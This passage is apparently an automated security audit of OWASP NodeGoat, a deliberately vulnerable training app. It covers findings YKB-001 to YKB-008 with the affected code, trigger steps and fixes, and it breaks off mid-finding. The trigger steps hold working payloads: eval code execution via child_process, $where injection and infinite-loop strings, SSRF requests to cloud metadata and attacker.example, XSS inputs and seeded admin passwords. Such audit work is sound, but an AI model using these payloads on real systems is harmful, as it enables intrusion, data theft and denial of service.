# Sample audit: OWASP NodeGoat

This is a real [Yakiba](https://yakiba.ai) security audit, shown in full. We ran Yakiba on [OWASP NodeGoat](https://github.com/OWASP/NodeGoat), a deliberately vulnerable web application, and this page is the report it produced.

**41 findings** · 🔴 1 critical · 🟠 8 high · 🟡 15 medium · 🔵 17 low

[Jump to the report](#the-report) · [Get an audit of your own repository](https://yakiba.ai)

## The repository we audited

| Repository | [OWASP/NodeGoat](https://github.com/OWASP/NodeGoat) |
| --- | --- |
| **What it is** | A deliberately vulnerable web application that OWASP maintains to teach the OWASP Top 10 risks in Node.js |
| **Stack** | JavaScript: Node.js, Express, MongoDB, Swig templates |
| **Size** | 23 source files (about 1,500 lines) and 11 page templates |
| **Commit audited** | [`c5cb68a`](https://github.com/OWASP/NodeGoat/tree/c5cb68a7084e4ae7dcc60e6a98768720a81841e8) on `master` |
| **Audited** | 17 November 2026 |

## Results

The audit reported **41 findings**: 38 confirmed and 3 leads.

| Severity | Findings |
| --- | --- |
| 🔴 Critical | 1 |
| 🟠 High | 8 |
| 🟡 Medium | 15 |
| 🔵 Low | 17 |

- **Confirmed** means a second model checked the finding against the code and could show a concrete way to trigger it.
- **Lead** means the code looks risky but the check could not demonstrate it.
- **Every finding** names the file and lines, quotes the code, says how to trigger it, and gives a fix.

### Checked against NodeGoat's own list

NodeGoat ships with a tutorial that documents 20 flaws. This audit reported **all 20**, and 20 findings the tutorial does not list.


| Tutorial | Documented flaw | Reported as |
| --- | --- | --- |
| A1 | Server-side JavaScript injection through <code>eval()</code> | YKB-001 |
| A1 | NoSQL injection at login | YKB-011 |
| A1 | JavaScript injection through a MongoDB <code>$where</code> query | YKB-002 |
| A1 | Log injection at login | YKB-028 |
| A2 | Passwords stored in plain text | YKB-003 |
| A2 | Session cookie settings: no timeout, flags not set | YKB-023 |
| A2 | Session id not regenerated at login | YKB-017 |
| A2 | Username enumeration through login errors | YKB-016 |
| A2 | Weak password policy | YKB-029 |
| A3 | Stored cross-site scripting (template escaping off) | YKB-009 |
| A4 | Insecure direct object reference on allocations | YKB-004 |
| A5 | Security headers disabled | YKB-037 |
| A6 | Served over plain HTTP | YKB-037 |
| A6 | Personal and bank details stored unencrypted | YKB-010 |
| A7 | Missing admin check on the benefits pages | YKB-005 |
| A8 | No CSRF protection | YKB-024, YKB-012 |
| A9 | Vulnerable dependency (<code>marked</code> 0.3.5) | YKB-022, YKB-007 |
| A10 | Open redirect | YKB-013 |
| Extra | Regular expression denial of service | YKB-014 |
| Extra | Server-side request forgery | YKB-006 |

Also reported, and not on the tutorial's list:

- **YKB-008** Default admin and user accounts with published passwords are seeded into every deployment
- **YKB-015** Remote page body is echoed back as <code>text/html</code>, giving script execution from any forged response
- **YKB-018** Allocations path segment is reflected unescaped into a form action attribute
- **YKB-019** Login page echoes the posted user name unescaped into an HTML attribute
- **YKB-020** Signup page echoes posted user name and email unescaped
- **YKB-021** MongoDB runs without authentication and the app connects with no credentials
- **YKB-025** Every deploy runs a database reset that drops all collections
- **YKB-026** Vendored front-end libraries (jQuery 1.10.2, Bootstrap 3.0.0) have published XSS and prototype-pollution advisories
- **YKB-027** Internal error messages are rendered to the client on the 500 page
- **YKB-030** Signup checks for an existing user name and then inserts without a unique index, so the name can be taken twice
- **YKB-031** Database reset prints every user's plaintext password to the deploy log
- **YKB-032** Environment defaults to development, injecting a livereload script from a fixed non-TLS port into every page
- **YKB-033** Full configuration including secrets is dumped to stdout on every startup
- **YKB-034** Crypto key, TLS private key and ZAP API key are committed to the repository
- **YKB-035** Container runs an end-of-life Node.js and installs dependencies without the lockfile
- **YKB-036** Grunt db-reset task interpolates an environment value into a shell command
- **YKB-038** A new server-side session is created for every anonymous request and never expires
- **YKB-039** Profile website is HTML-encoded but used as a URL, so javascript: URLs survive into an href
- **YKB-040** Config-supplied script tags are injected raw into every page
- **YKB-041** TLS private key is committed to the repository

### About this sample

- **The wording is the audit's own.** This page only sets it out: bullets, code formatting, and each finding's verification notes folded away. One evidence excerpt quoted a private key; the key material is redacted here.
- **It is a sample, not a benchmark.** NodeGoat explains its own flaws in a tutorial that ships with the code.
- **Yakiba is an automated code review**, not a penetration test or a compliance attestation.

---

## The report

**Repository** github.com/OWASP/NodeGoat · **Branch** `master` · **Commit** `c5cb68a7084e`

### Summary

We audited github.com/OWASP/NodeGoat at commit c5cb68a7084e (branch master). Several independent AI reviewers each read the whole codebase; their findings were merged, and a verifier checked every one against the code.

38 findings were confirmed by verification (1 critical, 8 high, 15 medium, 14 low). 3 more look risky but could not be demonstrated; they are listed as leads. 3 reported issues were rejected during verification and are not included.

### Fix first

Fix "Payroll contribution form runs the posted values through `eval()`, so a logged-in user can execute server-side JavaScript" at `app/routes/contributions.js:28-34` first.

### Findings

41 findings, most severe first. Open one for its evidence, how to trigger it, and the fix.

<details open>
<summary><b>YKB-001</b> · 🔴 Critical · Payroll contribution form runs the posted values through <code>eval()</code>, so a logged-in user can execute server-side JavaScript</summary>

**Location:** [`app/routes/contributions.js:28-34`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/contributions.js#L28-L34) · **Category:** injection · **Status:** Confirmed

**What is wrong**

- `handleContributionsUpdate` passes three request-body fields straight into `eval()` (`contributions.js:32-34`).
- Anything JavaScript-evaluable is executed in the Node process before the numeric validation at `contributions.js:47` runs, so the validation does not protect anything.
- `req.body` comes from `bodyParser.urlencoded`/json (`server.js:71-75`), so a JSON POST gives full JS expressions and statements.

```js
    this.handleContributionsUpdate = (req, res, next) => {

        /*jslint evil: true */
        // Insecure use of eval() to parse inputs
        const preTax = eval(req.body.preTax);
        const afterTax = eval(req.body.afterTax);
        const roth = eval(req.body.roth);
```

**Impact**

- **Attacker:** any ordinary logged-in user (or an anonymous user via CSRF against a logged-in victim, see the CSRF finding).
- **Gain:** remote code execution as the server process - read files, run commands via `require('child_process')`, reach the MongoDB handle, pivot to the host.
- This is the most severe flaw in the app.

**How to trigger it**

- Log in (e.g. user1/`User1_123`), then `POST /contributions` with `Content-Type: application/json` and body `{"preTax":"require('child_process').execSync('id').toString()","afterTax":1,"roth":1}`.
- The expression is evaluated server-side; the result is then echoed back into the rendered contributions page, so command output is returned to the attacker.
- A one-liner is enough for denial of service: `{"preTax":"process.exit(1)","afterTax":0,"roth":0}`.

**How to fix it**

Replace `eval()` with strict numeric parsing and bounds checking (staying inside the documented 0-30% total):

```js
const toPct = (v) => { const s = String(v).trim(); if (!/^\d{1,2}$/.test(s)) return NaN; return Number(s); };
const preTax = toPct(req.body.preTax);
const afterTax = toPct(req.body.afterTax);
const roth = toPct(req.body.roth);

// then the existing isNaN/<0 checks, plus reject anything that is not a finite integer before use.
```

Suggested code for `app/routes/contributions.js`:

```js
const preTax = Number.parseInt(req.body.preTax, 10);
const afterTax = Number.parseInt(req.body.afterTax, 10);
const roth = Number.parseInt(req.body.roth, 10);
```

<details>
<summary>How it was verified</summary>

- Reachable and controlled: `POST /contributions` is `isLoggedIn`-guarded only (`app/routes/index.js:52`) and the three body fields are passed straight into `eval()` at `app/routes/contributions.js:32-34`, before the NaN/range validation at `:47-56`.
- `bodyParser.json()`/`urlencoded()` is mounted (`server.js:71-75`), so `req.body` values can be arbitrary strings from a JSON body.
- `format('require("child_process").execSync("id").toString()')` evaluates in the Express process =&gt; server-side JS execution as the node user.
- Note the trigger's claim that output is echoed back is slightly wrong: a string result fails `isNaN` at `:47` and only the generic "Invalid contribution percentages" is shown.
- Exfiltration instead works by throwing an Error whose message contains the output; the 500 handler renders err unescaped (`app/routes/error.js:10-12`, `server.js:137`).
- RCE itself is unconditional, so critical stands.

</details>

</details>

<details>
<summary><b>YKB-002</b> · 🟠 High · Allocations stock threshold is interpolated into a MongoDB <code>$where</code> JavaScript expression</summary>

**Location:** [`app/data/allocations-dao.js:57-86`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/data/allocations-dao.js#L57-L86) · **Category:** injection · **Status:** Confirmed

**What is wrong**

- `getByUserIdAndThreshold` builds a server-side JavaScript predicate by string interpolation: `this.stocks > '${threshold}'` (`allocations-dao.js:77-79`). threshold is taken unvalidated from `req.query` (`allocations.js:19-21`) and never parsed to a number - the safe `parseInt` version is only present as a comment (`allocations-dao.js:63-76`).
- The string is concatenated inside single quotes, so a quote in the query parameter breaks out into arbitrary JavaScript evaluated by MongoDB's server-side JS engine.

```js
    this.getByUserIdAndThreshold = (userId, threshold, callback) => {
        const parsedUserId = parseInt(userId);

        const searchCriteria = () => {

            if (threshold) {
                /*
                // Fix for A1 - 2 NoSQL Injection - escape the threshold parameter properly
                // Fix this NoSQL Injection which doesn't sanitze the input parameter 'threshold' and allows attackers
                // to inject arbitrary javascript code into the NoSQL query:
                // 1. 0';while(true){}'
                // 2. 1'; return 1 == '1
                // Also implement fix in allocations.html for UX.                             
                const parsedThreshold = parseInt(threshold, 10);
                
                if (parsedThreshold >= 0 && parsedThreshold <= 99) {
                    return {$where: `this.userId == ${parsedUserId} && this.stocks > ${parsedThreshold}`};
                }
                throw `The user supplied threshold: ${parsedThreshold} was not valid.`;
                */
                return {
                    $where: `this.userId == ${parsedUserId} && this.stocks > '${threshold}'`
                };
            }
            return {
                userId: parsedUserId
            };
        };

        allocationsCol.find(searchCriteria()).toArray((err, allocations) => {
```

**Impact**

- **Attacker:** any logged-in user.
- **Gain:** run arbitrary JavaScript inside mongod (`$where` code executes with access to the document), read documents of other users by making the predicate always true, and block the database with an infinite loop.

**How to trigger it**

- Log in, then `GET /allocations/1?threshold=0`'%20||%20true%20||%20'  -&gt; predicate becomes `this.userId == 1 && this.stocks > '0' || true || ''`, returning every allocation document.
- `GET /allocations/1?threshold=`';while(true){};var%20x='  spins mongod's JS engine forever and hangs the database for all users.
- `GET /allocations/2?threshold=0`'%20||%20`this.userId`==3%20||%20' leaks user 3's allocations.

**How to fix it**

Use the already-written fix, or better avoid `$where` entirely: parse and range-check the threshold then query natively, e.g. const `parsedThreshold` = `Number.parseInt`(threshold, 10); if (`Number.isNaN(parsedThreshold)` || `parsedThreshold` &lt; 0 || `parsedThreshold` &gt; 99) return callback(new Error('invalid threshold'), null); return { `userId`: `parsedUserId`, `stocks: { $gt: parsedThreshold }` };

Suggested code for `app/data/allocations-dao.js`:

```js
const parsedThreshold = Number.parseInt(threshold, 10);
if (Number.isNaN(parsedThreshold) || parsedThreshold < 0 || parsedThreshold > 99) {
    return callback(new Error("invalid threshold"), null);
}
return { userId: parsedUserId, stocks: { $gt: parsedThreshold } };
```

<details>
<summary>How it was verified</summary>

- Confirmed.
- `allocations-dao.js:77-79` interpolates the raw `threshold` into `this.stocks > '${threshold}'` inside a `$where` clause (the safe `parseInt` variant is only a comment at `allocations-dao.js:63-75`); the value comes straight from `req.query` in `app/routes/allocations.js:19-21`.
- Reachable by any logged-in user at `GET /allocations/:userId` (`index.js:63`, only `isLoggedIn`).
- A crafted threshold breaks out of the single-quoted string and runs arbitrary JavaScript inside mongod: `threshold=0`' || `this.userId`==3 || ' reads user 3's allocations via the same route, and `';while(true){};var x='` spins the JS engine, blocking the database for all users.
- Cross-user exposure plus server-side JS execution and DoS with an ordinary account justify high.

</details>

</details>

<details>
<summary><b>YKB-003</b> · 🟠 High · Passwords are stored and compared in plain text</summary>

**Location:** [`app/data/user-dao.js:17-66`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/data/user-dao.js#L17-L66) · **Category:** authentication · **Status:** Confirmed

**What is wrong**

`addUser` writes the raw request password into the users document (`user-dao.js:25`; the bcrypt version is only the comment at `user-dao.js:26-30`), and `validateLogin` compares the stored value with the submitted one using strict string equality (`user-dao.js:60-66`, `fromDB === fromUser`). bcrypt-nodejs is required at `user-dao.js:1` but never used on the live path.

```js
    this.addUser = (userName, firstName, lastName, password, email, callback) => {

        // Create user document
        const user = {
            userName,
            firstName,
            lastName,
            benefitStartDate: this.getRandomFutureDate(),
            password //received from request param
            /*
            // Fix for A2-1 - Broken Auth
            // Stores password  in a safer way using one way encryption and salt hashing
            password: bcrypt.hashSync(password, bcrypt.genSaltSync())
            */
        };

        // Add email if set
        if (email) {
            user.email = email;
        }

        this.getNextSequence("userId", (err, id) => {
            if (err) {
                return callback(err, null);
            }
            console.log(typeof(id));

            user._id = id;
            usersCol.insert(user, (err, result) => !err ? callback(null, result.ops[0]) : callback(err, null));
        });
    };

    this.getRandomFutureDate = () => {
        const today = new Date();
        const day = (Math.floor(Math.random() * 10) + today.getDay()) % 29;
        const month = (Math.floor(Math.random() * 10) + today.getMonth()) % 12;
        const year = Math.ceil(Math.random() * 30) + today.getFullYear();
        return `${year}-${("0" + month).slice(-2)}-${("0" + day).slice(-2)}`;
    };

    this.validateLogin = (userName, password, callback) => {

        // Helper function to compare passwords
        const comparePassword = (fromDB, fromUser) => {
            return fromDB === fromUser;
            /*
            // Fix for A2-Broken Auth
            // compares decrypted password stored in this.addUser()
            return bcrypt.compareSync(fromDB, fromUser);
            */
```

**Impact**

- **Attacker:** anyone who can read the users collection - a Mongo dump/backup, a NoSQL injection or SSRF-adjacent read, an operator, or a leaked log/DB export.
- **Gain:** every user's password in cleartext, immediately reusable on this app and on any other site where users reused them.
- The seed script also stores plaintext (`artifacts/db-reset.js:18`,27,35) and the test fixtures carry the same credentials (test/e2e/fixtures/users/\*.json).

**How to trigger it**

Inspect any user document in the users collection (e.g. `db.users.find()`) - the password field reads `Admin_123` / `User1_123` / whatever the user typed at signup. A newly signed-up user's password is likewise readable byte-for-byte.

**How to fix it**

Hash on write and compare with `bcrypt.compareSync`(`fromUser`, `fromDB`) (note the commented fix has the arguments reversed), i.e. in `addUser`: password: `bcrypt.hashSync`(password, `bcrypt.genSaltSync()`), and reseed so the demo users' stored hashes match.

Suggested code for `app/data/user-dao.js`:

```js
// user-dao.js addUser
password: bcrypt.hashSync(password, bcrypt.genSaltSync())

// user-dao.js comparePassword
return bcrypt.compareSync(fromUser, fromDB);
```

<details>
<summary>How it was verified</summary>

- Confirmed.
- `user-dao.js:25` stores the raw request password (`password //received from request param`) with the bcrypt version only in a comment at `user-dao.js:26-30`; `validateLogin`'s `comparePassword` uses plain string equality `fromDB === fromUser` (`user-dao.js:59-66`) with `bcrypt.compareSync` only commented out at `user-dao.js:64-66`. bcrypt-nodejs is required at `user-dao.js:1` but never used on the live path.
- The seed script stores plaintext too (`artifacts/db-reset.js:18`,27,35).
- Any read of the users collection (dump, backup, the allocations `$where` injection at `allocations-dao.js:77-79` via error paths, operator) yields every cleartext password; per the scale, plaintext password storage is high.

</details>

</details>

<details>
<summary><b>YKB-004</b> · 🟠 High · Allocations page reads the employee id from the URL instead of the session, exposing any user's asset allocation</summary>

**Location:** [`app/routes/allocations.js:11-30`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/allocations.js#L11-L30) · **Category:** access-control · **Status:** Confirmed

**What is wrong**

- `displayAllocations` takes `userId` from `req.params` (`allocations.js:16-18`) rather than `req.session` (the safe version is only a comment at `allocations.js:12-15`) and passes it to `getByUserIdAndThreshold`, which returns the document of whoever that id belongs to, including `firstName`/`lastName`/`userName` (`allocations-dao.js:93-107`).
- The route is guarded only by `isLoggedIn` (`index.js:63`), so the only requirement is any valid account.

```js
    this.displayAllocations = (req, res, next) => {
        /*
        // Fix for A4 Insecure DOR -  take user id from session instead of from URL param
        const { userId } = req.session;
        */
        const {
            userId
        } = req.params;
        const {
            threshold
        } = req.query;

        allocationsDAO.getByUserIdAndThreshold(userId, threshold, (err, allocations) => {
            if (err) return next(err);
            return res.render("allocations", {
                userId,
                allocations,
                environmentalScripts
            });
        });
```

**Impact**

- **Attacker:** any ordinary logged-in user.
- **Gain:** read other employees' retirement allocations (and their names), i.e. another tenant/user's financial record, simply by changing the numeric id.
- Ids are small sequential integers (1 = admin, 2 = user1, 3 = user2; new users get the next counter value from `user-dao.js:109-120`), so every record is enumerable.

**How to trigger it**

Log in as user2, then browse `/allocations/1` and `/allocations/3`: the rendered page shows the allocations and full name of another user. Repeat with increasing ids to enumerate every employee.

**How to fix it**

- Take the id from the session and ignore the path parameter: const { `userId` } = `req.session`; (replacing `allocations.js:16-18`).
- If an admin needs to view arbitrary employees, expose that behind the existing `isAdmin` middleware (`app/routes/index.js:58-59`) with an explicit authorization check.

Suggested code for `app/routes/allocations.js`:

```js
const { userId } = req.session;
const { threshold } = req.query;
```

<details>
<summary>How it was verified</summary>

- Confirmed.
- `app/routes/allocations.js:16-18` takes `userId` from `req.params` (the session-based fix exists only in the comment at `allocations.js:12-15`) and the route is guarded solely by `isLoggedIn` (`app/routes/index.js:63`).
- `getByUserIdAndThreshold` returns allocations for whichever id is supplied and decorates them with `userName`/`firstName`/`lastName` (`allocations-dao.js:81-112`).
- Ids are small sequential integers starting at 1-3 for the seed users (`artifacts/db-reset.js:22-37`, counters seq reset at `db-reset.js:98-101`), so any logged-in user can enumerate every employee's allocations by browsing `/allocations/1`, `/allocations/2`, ...
- Access to other users' financial records with an ordinary account is high.

</details>

</details>

<details>
<summary><b>YKB-005</b> · 🟠 High · Benefits pages are wired without the admin role check, letting any user list every employee and change their benefits date</summary>

**Location:** [`app/routes/index.js:55-60`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/index.js#L55-L60) · **Category:** access-control · **Status:** Confirmed

**What is wrong**

- The `/benefits` routes only use `isLoggedIn`; the `isAdmin` middleware is defined (`index.js:27`, `session.js:25-34`) but its use is commented out at `index.js:57-60`.
- `GET /benefits` then returns every non-admin user's \_id, `firstName`, `lastName` and `benefitStartDate` (`benefits-dao.js:15-21`, `benefits.html:47-65`), and `POST /benefits` writes a new `benefitStartDate` for whatever `userId` is in the request body (`benefits.js:29-35` -&gt; `benefits-dao.js:23-40`, `_id: parseInt(userId)`), with no check that the target is the caller or that the caller is an admin.

```js
    app.get("/benefits", isLoggedIn, benefitsHandler.displayBenefits);
    app.post("/benefits", isLoggedIn, benefitsHandler.updateBenefits);
    /* Fix for A7 - checks user role to implement  Function Level Access Control
     app.get("/benefits", isLoggedIn, isAdmin, benefitsHandler.displayBenefits);
     app.post("/benefits", isLoggedIn, isAdmin, benefitsHandler.updateBenefits);
     */
```

**Impact**

- **Attacker:** any ordinary logged-in user.
- **Gain:** read the whole employee roster (names, employee ids, benefits dates) and modify other users' benefits records - an unauthorised write on another user's data.

**How to trigger it**

Log in as user1 (non-admin) and `GET /benefits`: the full employee table is rendered. Then `POST /benefits` with body `userId=1&benefitStartDate=1999-01-01` (or `userId=3` for another user) and the record of that user is updated.

**How to fix it**

Un-comment the admin middleware on both routes as reported, and validate the target id in `benefits.js` before the DAO call rather than trusting `parseInt`:

```js
const id = Number(userId);
if (!Number.isInteger(id) || id <= 0) { /* reject, re-render with error */ }
```

Also drop the fake `user: { isAdmin: true }` from `benefits.js`:21-23/44-46 and render the caller's real role from the session, so the nav/menu does not lie about privileges.

Suggested code for `app/routes/index.js`:

```js
app.get("/benefits", isLoggedIn, isAdmin, benefitsHandler.displayBenefits);
app.post("/benefits", isLoggedIn, isAdmin, benefitsHandler.updateBenefits);
```

<details>
<summary>How it was verified</summary>

- `isAdmin` is defined (`index.js:27`, `session.js:25-34`) but both `/benefits` routes are registered with only `isLoggedIn` (`index.js:55-56`); the admin-guarded versions are commented out (`index.js:57-60`).
- `benefits.js:13-27` calls `getAllNonAdminUsers` and renders the table with no role check, so any logged-in user gets every non-admin user's \_id, `firstName`, `lastName` and `benefitStartDate` (`benefits-dao.js:15-21`, `benefits.html:47-66`).
- `updateBenefits` (`benefits.js:29-54` -&gt; `benefits-dao.js:23-40`) writes `benefitStartDate` for whatever `userId` is in the body, with no admin check and no check that the target is the caller.
- A non-admin session reaches it because the `isLoggedIn` middleware only tests `req.session.userId` (`session.js:36-42`).
- Read of the roster plus unauthorised write to other users' records =&gt; high.

</details>

</details>

<details>
<summary><b>YKB-006</b> · 🟠 High · Stock research page fetches any URL supplied in the query string and echoes the response, allowing server-side request forgery</summary>

**Location:** [`app/routes/research.js:12-29`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/routes/research.js#L12-L29) · **Category:** ssrf · **Status:** Confirmed

**What is wrong**

- `displayResearch` builds the outbound request target from two unvalidated query parameters - `req.query.url + req.query.symbol` - and calls needle.get on it (`research.js:14-16`).
- There is no allow-list of hosts, no scheme restriction, and redirects are followed by default.
- The fetched body is then written back to the client (`research.js:22-26`), so the attacker gets the response content too.

```js
    this.displayResearch = (req, res) => {

        if (req.query.symbol) {
            const url = req.query.url + req.query.symbol;
            return needle.get(url, (error, newResponse, body) => {
                if (!error && newResponse.statusCode === 200) {
                    res.writeHead(200, {
                        "Content-Type": "text/html"
                    });
                }
                res.write("<h1>The following is the stock information you requested.</h1>\n\n");
                res.write("\n\n");
                if (body) {
                    res.write(body);
                }
                return res.end();
            });
        }
```

**Impact**

- **Attacker:** any logged-in user.
- **Gain:** full-read SSRF - reach services bound to localhost or the internal network that the Node process can reach (MongoDB on 27017 in docker-compose, cloud metadata endpoints such as 169.254.169.254, admin panels) and read their responses through the app.
- The URL parameter is even shipped as a hidden constant in the form (`research.html:17`), so only the symbol field is normally edited, but both are attacker-controlled.

**How to trigger it**

- Log in, then `GET /research?url=http://169.254.169.254/latest/meta-data/&symbol=iam%2Fsecurity-credentials%2F`  or `GET /research?url=http://127.0.0.1:27017/&symbol=`  - the internal response body is returned in the page.
- `GET /research?url=http://attacker.example/&symbol=x` sends a request from the server and reflects the reply.

**How to fix it**

- Keep the base URL server-side and only take the symbol from the client.
- E.g. in `app/routes/research.js:15` replace the client-supplied base with a constant, validate `symbol` with /^\[A-Z.\]{1,10}\$/, and pass needle options `{ follow: 0, timeout: 5000, rejectUnauthorized: true }`.
- Do not accept `url` from the query string even though the form ships it (`app/views/research.html:17`).

Suggested code for `app/routes/research.js`:

```js
if (typeof req.query.symbol === 'string' && /^[A-Z.]{1,10}$/.test(req.query.symbol)) {
    const url = 'https://finance.yahoo.com/quote/' + req.query.symbol;
    return needle.get(url, { follow: 0, timeout: 5000 },
        (error, newResponse, body) => { /* ... */ });
}
```

<details>
<summary>How it was verified</summary>

- Reachable: `GET /research` is behind `isLoggedIn` only (`app/routes/index.js:76`), so any logged-in user can hit it.
- Controlled: both query params are used raw - `const url = req.query.url + req.query.symbol` (`app/routes/research.js:15`) then `needle.get(url, ...)` (`research.js:16`) with no scheme/host check and needle's default redirect following.
- **Impact:** the Node process issues a request to any host the server can reach (127.0.0.1:27017, 169.254.169.254, internal admin ports) and writes the response body back (`research.js:18-26`).
- Minor correction to the trigger: `?symbol=` is falsy and short-circuits at `research.js:14`, so use a non-empty symbol (e.g. `symbol=x`) - the attacker still controls the full target via `url`.

</details>

</details>

<details>
<summary><b>YKB-007</b> · 🟠 High · Memos are stored as Markdown and rendered as raw HTML, giving stored XSS to every visitor of the memos page</summary>

**Location:** [`app/views/memos.html:28-34`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/app/views/memos.html#L28-L34) · **Category:** xss · **Status:** Confirmed

**What is wrong**

- `POST /memos` stores the raw request body (`memos-dao.js:15-24`), then `displayMemos` renders every stored memo to every logged-in user at `app/views/memos.html:31` as `{{ marked(doc.memo) }}`.
- Autoescaping is off (`server.js:135-142`), so the HTML produced by marked reaches the browser unfiltered, and the only protection is marked 0.3.5's `sanitize: true` (`server.js:126-128`), a known-bypassable option in that version.

```html
        {% for doc in memosList %}
        <div class="panel panel-info">
            <div class="panel-body">
                {{ marked(doc.memo) }}
            </div>
        </div>
        {% endfor %}
```

**Impact**

- **Attacker:** any logged-in user (memos are global - `memos-dao.js:26-35` returns all memos sorted by time, no per-user scoping).
- **Gain:** persistent script execution in the browser of every other user who opens `/memos`, including the admin.

**How to trigger it**

- Log in and `POST /memos` with memo=`<img src=x onerror=alert(document.domain)>` or a Markdown link with a javascript: target `[x](javascript:alert(1))`; then any user (including admin) loading `/memos` executes it.
- Alternatively POST raw `<script>` markup and reload `/memos`.

**How to fix it**

- Enable autoescape at `server.js:135-142` and keep the memos sink raw on purpose with `| safe`, but render through a maintained sanitizer instead of marked 0.3.5's `sanitize` flag (upgrade marked or run marked's output through sanitize-html/DOMPurify, allow-list href schemes http/https/mailto and escape URLs).
- Optionally scope memos per author.

Suggested code for `app/views/memos.html`:

```html
// server.js
const sanitizeHtml = require("sanitize-html");
const renderMemo = (md) => sanitizeHtml(marked(md), {
    allowedTags: sanitizeHtml.defaults.allowedTags.concat(["img"]),
    allowedAttributes: { a: ["href"], img: ["src", "alt"] },
    allowedSchemes: ["http", "https", "mailto"]
});
app.locals.marked = renderMemo;
swig.setDefaults({ autoescape: true });

// app/views/memos.html
{{ marked(doc.memo) | safe }}
```

<details>
<summary>How it was verified</summary>

- Reachable, controlled, and exploitable.
- `app/routes/index.js:66-67` expose `GET/POST /memos` behind `isLoggedIn` only; `app/routes/memos.js:13` stores `req.body.memo` verbatim and `app/data/memos-dao.js:15-35` returns every memo globally (no per-user scoping), so any ordinary account poisons the page every user sees.
- `memos.html:31` outputs `{{ marked(doc.memo) }}` with swig autoescape off (`server.js:135-142`), so marked's HTML reaches the browser unfiltered; the only filter is marked 0.3.5 with `sanitize:true` (`server.js:126-128`).
- Correction to the claim's trigger: that sanitizer escapes raw HTML, so a posted `<img src=x onerror=...>` or `<script>` is rendered as text (marked turns html blocks into escaped paragraphs when sanitize is on).
- The working payloads are the entity-encoded javascript: links the app's own tutorial documents at `app/views/tutorial/a9.html:139-163`, e.g. `[Hi there](javascript&#58;alert(1&#41;)`, which survive the URL check when sanitize is on and execute when a victim clicks the rendered link.
- Stored XSS in a login-only shared page =&gt; high; note it needs a click on the link.

</details>

</details>

<details>
<summary><b>YKB-008</b> · 🟠 High · Default admin and user accounts with published passwords are seeded into every deployment</summary>

**Location:** [`artifacts/db-reset.js:12-37`](https://github.com/OWASP/NodeGoat/blob/c5cb68a7084e4ae7dcc60e6a98768720a81841e8/artifacts/db-reset.js#L12-L37) · **Category:** secrets · **Status:** Confirmed

**What is wrong**

- `artifacts/db-reset.js` seeds fixed accounts admin/`Admin_123` (`isAdmin: true`, `db-reset.js:13-20`), user1/`User1_123` and user2/`User2_123` (`db-reset.js:21-36`), in plain text, and the same credentials are committed in the test fixtures (`test/e2e/fixtures/users/admin.json:3`, `user.json:3`) and used by `test/security/profile-test.js:36-37`.
- `app.json:12-14` wires this script as the Heroku postdeploy step and `docker-compose.yml:9` runs it at container start, so every deployment ships the same known admin password.

```js
const USERS_TO_INSERT = [
    {
        "_id": 1,
        "userName": "admin",
        "firstName": "Node Goat",
        "lastName": "Admin",
        "password": "Admin_123",
        //"password" : "$2a$10$8Zo/1e8KM8QzqOKqbDlYlONBOzukWXrM.IiyzqHRYDXqwB3gzDsba", // Admin_123
        "isAdmin": true
    }, {
        "_id": 2,
        "userName": "user1",
        "firstName": "John",
        "lastName": "Doe",
        "benefitStartDate": "2030-01-10",
        "password": "User1_123"
        // "password" : "$2a$10$RNFhiNmt2TTpVO9cqZElb.LQM9e1mzDoggEHufLjAnAKImc6FNE86",// User1_123
    }, {
        "_id": 3,
        "userName": "user2",
        "firstName": "Will",
        "lastName": "Smith",
        "benefitStartDate": "2025-11-30",
        "password": "User2_123"
        //"password" : "$2a$10$Tlx2cNv15M0Aia7wyItjsepeA8Y6PyBYaNdQqvpxkIUlcONf1ZHyq", // User2_123
    }];
```

**Impact**

- **Attacker:** an anonymous visitor against any deployment that did not change the seed.
- **Gain:** immediate admin login with published credentials (admin/`Admin_123`), giving access to the benefits administration page and, with the other findings here, code execution via `/contributions`.

**How to trigger it**

Log in at `/login` with admin / `Admin_123` on a freshly deployed instance (docker-compose up or Heroku postdeploy) - the account is created by `db-reset.js` and never expires.

**How to fix it**

- Seed hashed passwords and a per-deployment admin secret. bcrypt is already a dependency and the code exists commented out: hashing at `app/data/user-dao.js:26-30` and the matching `compareSync` at `user-dao.js:60-66` (leaving the cleartext `===` compare at `:61` in place is what makes the published password work).
- Read the admin password from an env var at `artifacts/db-reset.js` and force a change on first login; keep demo accounts to the dev/test seed path.

Suggested code for `artifacts/db-reset.js`:

```js
// artifacts/db-reset.js
const bcrypt = require("bcrypt-nodejs");
const adminPassword = process.env.ADMIN_PASSWORD || require("crypto").randomBytes(12).toString("hex");
const USERS_TO_INSERT = [{
    "_id": 1, "userName": "admin", "firstName": "Node Goat", "lastName": "Admin",
    "password": bcrypt.hashSync(adminPassword, bcrypt.genSaltSync()),
    "isAdmin": true
}, /* user1, user2 seeded the same way */];
// and enable the bcrypt compare at app/data/user-dao.js:60-66
```

<details>
<summary>How it was verified</summary>

- Confirmed, and this is the more complete of the two duplicate reports (it covers the seed, the fixtures and the deploy wiring).
- `artifacts/db-reset.js:12-37` seeds admin/`Admin_123` with `isAdmin:true` plus user1/user2 with fixed passwords; login compares cleartext (`app/data/user-dao.js:57-67`, `fromDB === fromUser`; signup/seed store cleartext too, `user-dao.js:17-31`).
- The script is the deploy path: `docker-compose.yml:9` runs `node artifacts/db-reset.js` before `npm start`, `app.json:12-14` wires it as Heroku postdeploy, `Gruntfile.js:158-169` backs `grunt db-reset`.
- The same credentials are published at `test/e2e/fixtures/users/admin.json:3` and `test/security/profile-test.js:36-37`.
- Trigger: on a default deployment `POST /login` `userName=admin&password=Admin_123` succeeds, sets `req.session.userId` (`app/routes/session.js:116`) and the account has `isAdmin` true, so the admin-only features (`session.js:25-34`, `index.js:26-27`) and all users' benefits/allocations data are reachable.
